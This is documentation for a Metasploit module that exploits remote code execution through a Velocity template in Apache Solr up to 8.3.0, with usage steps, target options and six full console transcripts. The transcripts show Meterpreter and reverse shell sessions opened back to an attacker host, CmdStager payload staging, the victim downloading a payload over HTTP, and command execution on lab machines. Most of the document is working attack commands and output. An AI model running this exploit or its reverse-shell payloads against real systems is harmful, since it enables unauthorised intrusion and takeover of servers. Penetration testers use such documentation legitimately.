## Description
This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom
Velocity template. Currently, this module only supports Solr basic authentication.

**From the Tenable advisory**

Link: https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability

An attacker could target a vulnerable Apache Solr instance by first
identifying a list of Solr core names. Once the core names have been
identified, an attacker can send a specially crafted HTTP POST request
to the Config API to toggle the params resource loader value for the
Velocity Response Writer in the solrconfig.xml file to true. Enabling
this parameter would allow an attacker to use the Velocity template
parameter in a specially crafted Solr request, leading to RCE.

## Vulnerable Applications

Apache Solr <= 8.3.0

## Verification Steps

1. Start `msfconsole`
2. `use exploit/multi/http/solr_velocity_rce`
3. `set RHOST <target_ip>`
4. `set RPORT <target_port>`
5. `set USERNAME <username>` (if applicable)
6. `set PASSWORD <password>` (if applicable)
7. Ideally run `check`
8. `set TARGET` based on output of `check`
9. `set PAYLOAD <payload_name>` if you want to use other payloads
10. `set LHOST <your_ip>`
11. `set LPORT <your_port>`
12. Optional: `set VERBOSE true` to get verbose output
13. Optional: `set TARGETURI <path_to_solr>` if target system uses a different path to Apache Solr
14. `exploit` and let the shells rain

## Considerations

Privileges gained are dependent on the user running Solr. Currently,
this module only supports basic auth.

The "Java (in-memory)" target should work on any vulnerable system
regardless of OS. It requires that the victim system be able to make
HTTP requests to the attack platform.

Windows systems have 3 targets:
1. x86/64 Windows PowerShell: Uses `PowerShell` to get a shell. Payload defaults to `windows/meterpreter/reverse_tcp`
2. x86/64 Windows CmdStager: Uses `CmdStager` to get a shell. Payload defaults to `windows/meterpreter/reverse_tcp`
3. Windows Exec: Executes a command and returns the output. Payload defaults to `cmd/windows/generic`

*nix systems have 2 targets:
1. Unix (in memory): Uses command execution. Payload defaults to `cmd/unix/reverse_bash`. Output may be returned depending on payload used.
2. Linux (dropper): Uses `CmdStager`. Payload defaults to `linux/x86/meterpreter/reverse_tcp`

## Examples

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using PowerShell
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.155
RHOSTS => 192.168.137.132
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 2
TARGET => 2
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[+] Found Powershell at C:\Windows\System32\WindowsPowerShell\v1.0\
[*] Sending stage (180291 bytes) to 192.168.137.155
[*] Meterpreter session 1 opened (192.168.137.128:4444 -> 192.168.137.155:50210) at 2020-03-29 00:04:01 +0800

meterpreter > sysinfo
Computer        : 2K19DTCTR
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
gSystem Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using CmdStager
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.155
RHOSTS => 192.168.137.132
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 3
TARGET => 3
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[*] Sending CmdStager payload...
[*] Command Stager progress -   7.05% done (7160/101541 bytes)
[*] Command Stager progress -  14.10% done (14320/101541 bytes)
[*] Command Stager progress -  21.15% done (21480/101541 bytes)
[*] Command Stager progress -  28.21% done (28640/101541 bytes)
[*] Command Stager progress -  35.26% done (35800/101541 bytes)
[*] Command Stager progress -  42.31% done (42960/101541 bytes)
[*] Command Stager progress -  49.36% done (50120/101541 bytes)
[*] Command Stager progress -  56.41% done (57280/101541 bytes)
[*] Command Stager progress -  63.46% done (64440/101541 bytes)
[*] Command Stager progress -  70.51% done (71600/101541 bytes)
[*] Command Stager progress -  77.56% done (78760/101541 bytes)
[*] Command Stager progress -  84.62% done (85920/101541 bytes)
[*] Command Stager progress -  91.67% done (93080/101541 bytes)
[*] Command Stager progress -  98.67% done (100188/101541 bytes)
[*] Sending stage (180291 bytes) to 192.168.137.155
[*] Command Stager progress - 100.00% done (101541/101541 bytes)
[*] Meterpreter session 2 opened (192.168.137.128:4444 -> 192.168.137.155:50211) at 2020-03-29 00:06:01 +0800

meterpreter > sysinfo
Computer        : 2K19DTCTR
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, with payload `cmd/windows/generic`
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.155
RHOSTS => 192.168.137.132
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 4
TARGET => 4
msf5 exploit(multi/http/solr_velocity_rce) > set CMD whoami
CMD => whoami
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[+] 2k19dtctr\administrator
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/solr_velocity_rce) >
```

### Bitnami Solr VM 8.3.0, requiring basic authentication, command execution in-memory, with payload `cmd/unix/reverse_bash`
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.129
RHOSTS => 192.168.137.129
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 0
TARGET => 0
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[*] Command shell session 17 opened (192.168.137.128:4444 -> 192.168.137.129:48600) at 2020-03-29 00:20:50 +0800

id
uid=999(solr) gid=1002(solr) groups=1002(solr)
```

### Bitnami Solr VM 8.3.0, requiring basic authentication, command execution in-memory, with payload `cmd/unix/generic`
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.129
RHOSTS => 192.168.137.129
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 0
TARGET => 0
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > set CMD whoami
CMD => whoami
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[+] solr
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/solr_velocity_rce) >
```

### Bitnami Solr VM 8.3.0, requiring basic authentication, using CmdStager, with payload `linux/x86/meterpreter/reverse_tcp`
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.137.129
RHOSTS => 192.168.137.129
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 1
TARGET => 1
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.137.128
LHOST => 192.168.137.128
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.128:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[*] Using URL: http://0.0.0.0:8080/PDeRPN1t
[*] Local IP: http://192.168.137.128:8080/PDeRPN1t
[*] Client 192.168.137.129 (curl/7.52.1) requested /PDeRPN1t
[*] Sending payload to 192.168.137.129 (curl/7.52.1)
[*] Sending stage (985320 bytes) to 192.168.137.129
[*] Meterpreter session 18 opened (192.168.137.128:4444 -> 192.168.137.129:48604) at 2020-03-29 00:23:13 +0800
[*] Command Stager progress - 100.00% done (149/149 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.137.129
OS           : Debian 9.11 (Linux 4.9.0-11-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```
